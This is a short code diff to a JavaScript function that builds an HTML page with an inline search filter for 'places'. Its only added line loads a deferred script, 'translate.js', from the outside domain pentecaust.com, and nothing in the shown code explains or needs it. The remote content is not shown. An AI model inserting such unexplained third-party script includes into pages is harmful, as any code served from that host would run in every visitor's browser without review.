@@ -265,6 +265,7 @@ secs.forEach(function(s){var any=s.querySelector('.it:not([style*="none"])');s.s
 cnt.textContent=w.length?n+' of '+total+' places match':total+' places in '+nsec+' sections';none.style.display=n?'none':'block'}
 q.addEventListener('input',run);if(location.hash==='#search')q.focus();})();
 </script>
+<script src="https://pentecaust.com/translate.js" defer></script>
 </body></html>`;
 }
 
